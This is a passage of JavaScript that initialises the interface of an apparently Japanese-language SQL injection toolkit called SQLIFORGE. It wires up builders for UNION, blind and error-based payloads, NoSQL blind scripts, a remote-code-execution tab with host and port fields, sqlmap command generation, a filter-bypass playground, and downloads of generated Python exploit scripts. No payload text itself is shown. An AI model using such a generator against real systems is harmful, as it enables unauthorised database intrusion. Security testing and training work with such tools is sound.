      +(n.notes?'<ul class="wz-notes">'+n.notes.map(x=>'<li>'+esc(x)+'</li>').join("")+'</ul>':"")
      +'<div class="wz-links">'+n.links.map(l=>'<button type="button" class="btn tiny" data-act="'+l.act+'">'+esc(l.t)+'</button>').join("")+'</div>';
    b.querySelectorAll(".wz-links .btn").forEach(btn=>btn.addEventListener("click",()=>WZ_ACT[btn.dataset.act]()));
  }
}

function initUI(){
  window.SQLIFORGE=window.SQLIFORGE||{_lastScript:""};
  initTabs();
  fillSelect("un-prefix",PREFIXES,"'");
  fillSelect("bl-prefix",PREFIXES,"'");
  fillSelect("er-prefix",PREFIXES,"'");
  fillSelect("un-comment",COMMENTS,"-- -");
  fillSelect("bl-comment",COMMENTS,"-- -");
  fillSelect("er-comment",COMMENTS,"-- -");
  fillDbms("un-dbms","mysql");
  fillDbms("bl-dbms","mysql");
  fillDbms("er-dbms","mysql");
  fillSelect("bp-preset",PRESETS.map(p=>({v:PRESETS.indexOf(p)+"",label:p.label})),"0");

  renderDetect(); renderDetectStatic();
  $("det-urlenc").addEventListener("change",()=>{renderDetect();renderDetectStatic();});

  const unRerender=()=>unBuild();
  ["un-dbms","un-prefix","un-comment"].forEach(id=>$(id).addEventListener("change",unRerender));
  ["un-cols","un-echo"].forEach(id=>$(id).addEventListener("input",unRerender));
  ["un-table","un-col"].forEach(id=>$(id).addEventListener("input",unRerender));
  if($("un-col2")) $("un-col2").addEventListener("input",unRerender);
  $("un-urlenc").addEventListener("change",unRerender);
  $("un-gen").addEventListener("click",()=>{unBuild();toast("生成しました");});
  $("un-wl-gen").addEventListener("click",unWordlist);
  unBuild();
  $("un-ctx").addEventListener("change",renderCtx);
  renderCtx();
  $("un-keyword").addEventListener("input",renderXenum);
  renderXenum();

  renderNosql();
  ["ns-url","ns-up","ns-pp","ns-user","ns-marker"].forEach(id=>{const el=$(id); if(el) el.addEventListener("input",()=>genNosqlScript(false));});
  $("ns-req").addEventListener("change",()=>genNosqlScript(false));
  $("ns-gen").addEventListener("click",()=>genNosqlScript(true));
  $("ns-dl").addEventListener("click",()=>{
    const blob=new Blob([window.SQLIFORGE._lastNosql||""],{type:"text/x-python"});
    const a=document.createElement("a");
    a.href=URL.createObjectURL(blob); a.download="nosql_blind.py"; a.click();
    toast("nosql_blind.py をダウンロードしました");
  });
  genNosqlScript(false);

  fillDbms("rc-dbms","mysql");
  $("rc-dbms").addEventListener("change",renderRce);
  ["rc-host","rc-port","rc-domain","rc-path"].forEach(id=>$(id).addEventListener("input",renderRce));
  renderRce();

  $("sm-gen").addEventListener("click",genSqlmap);
  genSqlmap();

  $("wz-restart").addEventListener("click",wzRestart);
  renderWizard();

  const blRerender=()=>renderBlind();
  ["bl-dbms","bl-prefix","bl-comment","sc-mode","sc-range","sc-method","sc-reqtype","ns-req"].forEach(id=>{const el=$(id); if(el) el.addEventListener("change",blRerender);});
  ["bl-col","bl-table","bl-where","bl-row","sc-url","sc-param","sc-marker","sc-delay","sc-len","sc-threads","sc-hdrname","sc-headers"].forEach(id=>{const el=$(id); if(el) el.addEventListener("input",blRerender);});
  $("bl-enc").addEventListener("change",blRerender);
  renderBlind();
  $("sc-gen").addEventListener("click",()=>genScript(true));
  $("sc-download").addEventListener("click",()=>{
    const blob=new Blob([window.SQLIFORGE._lastScript||""],{type:"text/x-python"});
    const a=document.createElement("a");
    a.href=URL.createObjectURL(blob); a.download="blind.py"; a.click();
    toast("blind.py をダウンロードしました");
  });

  const erRerender=()=>renderErrors();
  ["er-dbms","er-prefix","er-comment"].forEach(id=>$(id).addEventListener("change",erRerender));
  renderErrors();

  renderChips();
  $("bp-run").addEventListener("click",runBypass);
  $("bp-clear").addEventListener("click",()=>{active.clear();customBans.clear();$("bp-custom").value="";renderChips();refreshAll();});
  $("bp-input").addEventListener("input",runBypass);
  $("bp-mode").addEventListener("change",()=>{runBypass();refreshAll();});
  $("bp-custom").addEventListener("input",parseCustomBans);
  $("bp-preset").addEventListener("change",()=>{
    const p=PRESETS[parseInt($("bp-preset").value,10)];
    active.clear(); (p.ids||[]).forEach(i=>active.add(i));
    renderChips(); refreshAll();
  });
  $("bp-analyze").addEventListener("click",runAnalyze);
  renderProbes();
  $("bp-apply-probes").addEventListener("click",applyProbes);
  $("bp-copy-probes").addEventListener("click",()=>copyText(FILTER_PROBES.map(f=>f.p).join("\n"),"プローブ一覧"));
  $("bp-copy").addEventListener("click",()=>copyText($("bp-out").textContent,"ペイロード"));
  $("bp-copy-enc").addEventListener("click",()=>copyText($("bp-out-enc").textContent,"URLエンコード版"));
  runBypass();

  $("tl-input").addEventListener("input",renderTools);
  renderTools();
  $("cu-gen").addEventListener("click",genCurl);
  genCurl();

  $("ch-search").addEventListener("input",e=>renderCheat(e.target.value));
  renderCheat("");

  document.addEventListener("click",e=>{
    const p=e.target&&e.target.closest?e.target.closest(".payload"):null;
    if(p&&p.textContent.trim()) copyText(p.textContent,"ペイロード");
  });

  window.SQLIFORGE.cp=(btn)=>copyText(btn.dataset.v);
  window.SQLIFORGE.go=(name)=>switchTab(name);
  window.SQLIFORGE.clearFilters=()=>{active.clear();renderChips();refreshAll();toast("フィルタを解除しました");};
  window.SQLIFORGE.toBypass=(btn)=>{
    $("bp-input").value=btn.dataset.v;
    switchTab("bypass");
    runBypass();
    toast("プレイグラウンドへ送りました");
  };
  window.SQLIFORGE._internals={active:active,refreshAll:refreshAll,wzGo:wzGo,renderWizard:renderWizard,wz:wz,customBans:customBans,parseCustomBans:parseCustomBans,setBans:s=>{customBans=s;}};
  refreshAll();
  genScript(false);
}

document.addEventListener("DOMContentLoaded",initUI);

}
